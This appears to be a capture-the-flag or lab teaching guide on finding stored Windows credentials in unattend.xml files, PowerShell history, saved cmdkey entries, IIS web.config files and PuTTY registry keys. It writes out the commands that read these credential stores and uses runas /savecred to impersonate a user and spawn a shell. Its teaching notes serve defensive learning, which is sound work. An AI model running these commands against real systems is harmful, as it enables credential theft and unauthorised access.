# Windows Credential Retrieval
## 1. Unattended Windows Installations
Context:  
Administrators may use unattended installations to deploy Windows automatically.  
During setup, credentials like Administrator can get stored in files such as:
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

Sometimes passwords are stored in cleartext under <Credentials> tags.
Walkthrough Explanation:  
1. Open the file with notepad or type command:  
```
type C:\Windows\Panther\Unattend\Unattend.xml
```
Search for <Credentials> or <Password> tags.  
Extract the username and password.  

Teaching Point:  
Highlight why storing passwords in plain text here is risky.  
Show that attackers or automated scripts can scan these default locations for credentials.

---

## 2. PowerShell History
Context:  
PowerShell logs commands by default in:
```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
Any commands with passwords typed directly are stored here.  

Walkthrough Explanation:  
From cmd.exe:
```

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

```
From PowerShell:
```

type \$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

```
Look for julia.jones or any suspicious command containing a password.  

Teaching Point:  
Emphasize never typing passwords in cleartext in CLI commands.  
Explain why secure vaults or Get-Credential in PowerShell are safer.  

---

## 3. Saved Windows Credentials
Context:  
Windows can store credentials for easier logins.  
Commands to inspect them:  
```

cmdkey /list

```
To use a saved credential to run a program:
```

runas /savecred /user:USERNAME cmd.exe

```

Walkthrough Explanation:  
List saved credentials:
```

cmdkey /list

```
Identify mike.katz or another user you want to impersonate.  
Spawn a shell as that user:
```

runas /savecred /user:mike.katz cmd.exe

```
Navigate to their desktop to find the flag:
```

cd C:\Users\mike.katz\Desktop
type flag.txt

```

Teaching Point:  
Highlight impersonation risk if credentials are saved carelessly.  
Show practical use of /savecred in penetration testing.

---

## 4. IIS Configuration
Context:  
IIS web server stores configuration in web.config files.  
Connection strings may contain database passwords.  

Locations to check:
```

C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```

Walkthrough Explanation:  
Use findstr to search for connection strings:  
```

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

```
Look for `<add name="db_admin"` or similar tags containing `password=`.  
Extract the password from the string.  

Teaching Point:  
Cleartext passwords in configuration files are common and dangerous.  
Good opportunity to discuss web application security.

---

## 5. Retrieving PuTTY Stored Credentials
Context:  
PuTTY stores session configs in the Windows registry.  
Proxy passwords and usernames may be saved in cleartext.  

Registry key location:
```

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\

```

Walkthrough Explanation:  
Query the registry for stored sessions:  
```

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

```
Look for `ProxyPassword` and associated usernames.  

Teaching Point:  
Show how local applications can accidentally store passwords.  
Emphasize the importance of using key-based authentication for SSH.

---

## Summary of Your Approach for the Exercise

| Source                | Steps to Find Passwords                          | Key Notes                                           |
|------------------------|--------------------------------------------------|-----------------------------------------------------|
| PowerShell History     | `type ConsoleHost_history.txt`                   | Look for cleartext passwords typed in commands      |
| IIS web.config         | `type web.config` → `findstr connectionString`   | Database credentials often in cleartext             |
| Windows Saved Creds    | `cmdkey /list` → `runas /savecred`               | Spawn shell as saved user, retrieve flag            |
| PuTTY                  | `reg query ... /f "Proxy"`                       | Proxy username/password stored in registry          |
```
